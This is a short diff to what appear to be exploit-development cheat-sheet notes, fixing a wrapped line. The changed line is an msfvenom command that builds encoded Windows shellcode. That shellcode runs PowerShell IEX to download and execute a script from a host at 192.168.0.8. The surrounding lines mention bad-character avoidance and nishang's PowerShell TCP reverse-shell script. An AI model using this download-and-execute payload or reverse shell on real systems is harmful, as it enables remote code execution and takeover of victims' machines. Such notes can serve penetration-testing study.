@@ -42,9 +42,7 @@ sub esp,0x10
 
 trick: if to many bad char remove -e x86/shikata_ga_nai
 
-msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http
-://192.168.0.8/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\
-x0d' EXITFUNC=thread
+msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.8/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
 
 nishang Incoke.powershelltcp.ps1
 ```
